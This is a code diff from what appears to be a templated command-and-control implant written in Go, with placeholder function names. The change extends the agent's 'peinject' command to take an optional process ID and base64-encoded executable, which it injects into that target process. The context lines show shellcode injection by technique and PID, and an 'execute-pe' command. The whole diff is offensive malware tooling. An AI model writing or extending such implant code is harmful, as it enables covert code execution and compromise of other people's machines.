@@ -75,13 +75,37 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
         result := a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcodeData, technique, pid)
         return result
     } else if strings.HasPrefix(command, "peinject ") {
-        // Handle PE injection command - base64 content follows directly after "peinject "
-        encodedPE := command[9:] // Remove "peinject " prefix
+        // Handle PE injection command - can include PID parameter
+        remainingCommand := command[9:] // Remove "peinject " prefix
+
+        // Split the command into parts to determine the format
+        parts := strings.Split(remainingCommand, " ")
+
+        var encodedPE string
+        var pid uint32 = 0
+
+        if len(parts) == 1 {
+            // Format: "base64_pe_data" (no PID)
+            encodedPE = parts[0]
+        } else if len(parts) == 2 {
+            // Format: "pid base64_pe_data"
+            // Parse PID
+            parsedPid, err := strconv.Atoi(parts[0])
+            if err != nil || parsedPid <= 0 {
+                return fmt.Sprintf("[ERROR] Invalid PID: %s", parts[0])
+            }
+            pid = uint32(parsedPid)
+            encodedPE = parts[1]
+        } else {
+            return "[ERROR] Invalid peinject command format. Usage: peinject [pid] base64_pe_data"
+        }
+
         peData, err := base64.StdEncoding.DecodeString(encodedPE)
         if err != nil {
             return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
         }
-        result := a.{AGENT_INJECT_PE_FUNC}(peData)
+
+        result := a.{AGENT_INJECT_PE_FUNC}_with_pid(peData, pid)
         return result
     } else if strings.HasPrefix(command, "execute-pe ") {
         // Handle execute PE command - base64 content follows directly after "execute-pe "
